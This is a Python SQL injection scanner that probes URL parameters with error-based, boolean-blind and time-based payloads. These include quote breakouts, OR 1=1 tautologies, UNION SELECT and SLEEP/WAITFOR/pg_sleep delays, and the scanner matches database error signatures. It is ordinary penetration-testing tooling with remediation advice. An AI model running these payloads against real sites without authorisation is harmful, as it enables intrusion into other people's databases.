"""
SQL Injection scanner — error-based, boolean-blind, and time-based detection.
Tests URL parameters and form inputs.
"""

import re
import sys
import os
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.http import HTTPClient
from utils.reporter import Finding

# Error-based detection: DB error strings that leak in responses
SQL_ERRORS = {
    "MySQL": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
    ],
    "MSSQL": [
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"(\bSQL Server\b.*\bDriver\b|\bDriver\b.*\bSQL Server\b)",
        r"Warning.*mssql_",
        r"(\bSQL Server\b.*\bUnclosed quotation mark\b)",
        r"Microsoft SQL Native Client error",
    ],
    "Oracle": [
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"SQLITE_ERROR",
        r"unrecognized token",
    ],
    "Generic": [
        r"SQL syntax",
        r"sql error",
        r"syntax error.*sql",
        r"unclosed quotation mark",
        r"unterminated string",
        r"ODBC.*Driver",
        r"JDBC.*Driver",
    ],
}

# Payloads for different detection methods
ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "' UNION SELECT NULL--",
    "1 OR 1=1",
    "' OR ''='",
    "1'1",
    "') OR ('1'='1",
    "\\",
    "1;SELECT 1",
]

BOOLEAN_PAYLOADS = [
    # (true_payload, false_payload) — true should return same as original, false should differ
    ("' OR '1'='1' -- ", "' OR '1'='2' -- "),
    ("' OR 1=1 -- ", "' OR 1=2 -- "),
    ("\" OR \"1\"=\"1\" -- ", "\" OR \"1\"=\"2\" -- "),
    (" OR 1=1 -- ", " OR 1=2 -- "),
    ("' OR 'a'='a' -- ", "' OR 'a'='b' -- "),
    (") OR (1=1 -- ", ") OR (1=2 -- "),
]

TIME_PAYLOADS = [
    ("' OR SLEEP(5) -- ", 5),
    ("\" OR SLEEP(5) -- ", 5),
    (" OR SLEEP(5) -- ", 5),
    ("'; WAITFOR DELAY '0:0:5' -- ", 5),  # MSSQL
    ("' OR pg_sleep(5) -- ", 5),  # PostgreSQL
    ("' || (SELECT CASE WHEN 1=1 THEN sqlite3_sleep(5000) END) -- ", 5),  # SQLite
]


def detect_errors(body):
    """Check response body for SQL error messages. Returns (db_type, pattern) or None."""
    for db_type, patterns in SQL_ERRORS.items():
        for pattern in patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return db_type, pattern
    return None


def test_error_based(url, param, original_value, client):
    """Test a parameter for error-based SQLi."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for payload in ERROR_PAYLOADS:
        test_params = dict(params)
        test_params[param] = [original_value + payload]
        query = urlencode(test_params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, ""))

        resp = client.get(test_url)
        if not resp:
            continue

        error = detect_errors(resp.text)
        if error:
            db_type, pattern = error
            findings.append(Finding(
                title=f"SQL Injection (Error-based) in '{param}'",
                severity="critical",
                description=(
                    f"Parameter '{param}' is vulnerable to error-based SQL injection. "
                    f"Database type: {db_type}. The application returns database error messages."
                ),
                url=test_url,
                evidence=f"Payload: {payload}\nDB: {db_type}\nError pattern: {pattern}",
                remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
            ))
            return findings  # One confirmed finding is enough

    return findings


def test_boolean_blind(url, param, original_value, client):
    """Test for boolean-blind SQLi by comparing true/false condition responses."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Get baseline
    baseline = client.get(url)
    if not baseline:
        return findings
    baseline_size = len(baseline.content)

    for true_payload, false_payload in BOOLEAN_PAYLOADS:
        # True condition
        test_params = dict(params)
        test_params[param] = [original_value + true_payload]
        query = urlencode(test_params, doseq=True)
        true_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, ""))
        true_resp = client.get(true_url)

        # False condition
        test_params[param] = [original_value + false_payload]
        query = urlencode(test_params, doseq=True)
        false_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, ""))
        false_resp = client.get(false_url)

        if not true_resp or not false_resp:
            continue

        true_size = len(true_resp.content)
        false_size = len(false_resp.content)

        # If true response matches baseline but false response differs significantly
        true_diff = abs(true_size - baseline_size)
        false_diff = abs(false_size - baseline_size)

        if true_diff < 100 and false_diff > 200:
            findings.append(Finding(
                title=f"SQL Injection (Boolean-blind) in '{param}'",
                severity="high",
                description=(
                    f"Parameter '{param}' appears vulnerable to boolean-blind SQL injection. "
                    f"True and false conditions produce different responses."
                ),
                url=true_url,
                evidence=(
                    f"True payload: {true_payload}\n"
                    f"False payload: {false_payload}\n"
                    f"Baseline size: {baseline_size}\n"
                    f"True response size: {true_size} (diff: {true_diff})\n"
                    f"False response size: {false_size} (diff: {false_diff})"
                ),
                remediation="Use parameterized queries/prepared statements.",
            ))
            return findings

    return findings


def _median(xs):
    xs = sorted(xs)
    n = len(xs)
    if n == 0:
        return 0.0
    if n % 2:
        return xs[n // 2]
    return 0.5 * (xs[n // 2 - 1] + xs[n // 2])


def _stddev(xs):
    if len(xs) < 2:
        return 0.0
    mean = sum(xs) / len(xs)
    return (sum((x - mean) ** 2 for x in xs) / (len(xs) - 1)) ** 0.5


def test_time_based(url, param, original_value, client):
    """Time-based blind SQLi with 5-sample median baseline + 3-sigma confirmation."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # --- Baseline: 5 samples ---
    baseline_samples = []
    for _ in range(5):
        start = time.time()
        client.get(url)
        baseline_samples.append(time.time() - start)
    baseline_med = _median(baseline_samples)
    baseline_sig = max(0.2, _stddev(baseline_samples))
    # 3-sigma threshold + required absolute delay margin
    threshold = max(baseline_med + 3 * baseline_sig, baseline_med + 2.5)

    for payload, expected_delay in TIME_PAYLOADS[:3]:
        test_params = dict(params)
        test_params[param] = [original_value + payload]
        query = urlencode(test_params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, ""))

        # First sample
        start = time.time()
        resp = client.get(test_url)
        elapsed = time.time() - start
        if not resp or elapsed < threshold:
            continue
        if elapsed < (expected_delay * 0.7):  # delay must be close to requested
            continue

        # Confirm: 3 more samples, require median >= expected_delay * 0.8
        confirm_samples = [elapsed]
        for _ in range(2):
            s = time.time()
            client.get(test_url)
            confirm_samples.append(time.time() - s)
        conf_med = _median(confirm_samples)

        if conf_med >= expected_delay * 0.8 and conf_med > threshold:
            findings.append(Finding(
                title=f"SQL Injection (Time-based blind) in '{param}'",
                severity="high",
                finding_type="sqli",
                description=(
                    f"Parameter '{param}' is vulnerable to time-based blind SQL injection. "
                    f"Injecting a sleep payload consistently delays the response."
                ),
                url=test_url,
                payload=payload,
                params={param: original_value + payload},
                evidence=(
                    f"Payload: {payload}\n"
                    f"Expected delay: {expected_delay}s\n"
                    f"Baseline median: {baseline_med:.2f}s (sigma {baseline_sig:.2f})\n"
                    f"3-sigma threshold: {threshold:.2f}s\n"
                    f"Injected samples: {[round(s,2) for s in confirm_samples]} (median {conf_med:.2f}s)"
                ),
                impact="Full database compromise possible via blind data exfiltration.",
                reproduction_steps=[
                    f"curl -s -o /dev/null -w '%{{time_total}}' '{test_url}'",
                    "Observe response delay ~= sleep duration",
                ],
                references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                remediation="Use parameterized queries/prepared statements.",
            ))
            return findings

    return findings


def scan_url(url, verbose=True):
    """Test all parameters in a URL for SQLi."""
    client = HTTPClient(rate_limit=0.5, timeout=15, retries=1)
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return findings

    for param, values in params.items():
        original_value = values[0] if values else ""
        if verbose:
            print(f"    Testing param: {param}", flush=True)

        # Error-based (fastest)
        f = test_error_based(url, param, original_value, client)
        if f:
            findings.extend(f)
            if verbose:
                print(f"      [CRITICAL] Error-based SQLi found!")
            continue

        # Boolean-blind
        f = test_boolean_blind(url, param, original_value, client)
        if f:
            findings.extend(f)
            if verbose:
                print(f"      [HIGH] Boolean-blind SQLi found!")
            continue

        # Time-based (slowest, do last)
        f = test_time_based(url, param, original_value, client)
        if f:
            findings.extend(f)
            if verbose:
                print(f"      [HIGH] Time-based SQLi found!")

    return findings


def scan_multiple(urls, verbose=True):
    """Scan multiple URLs for SQLi."""
    all_findings = []
    for url in urls:
        parsed = urlparse(url)
        if not parsed.query:
            continue
        if verbose:
            print(f"  [{url[:80]}] testing SQLi...", flush=True)
        findings = scan_url(url, verbose)
        all_findings.extend(findings)
    return all_findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sqli.py <url_with_params>")
        print("Example: python sqli.py 'https://example.com/page?id=1&name=test'")
        sys.exit(1)
    url = sys.argv[1]
    print(f"\n[*] SQLi scan: {url}\n")
    findings = scan_url(url)
    if not findings:
        print("\n  No SQLi found")
    for f in findings:
        print(f"\n  [{f.severity.upper()}] {f.title}")
        print(f"  {f.evidence}")
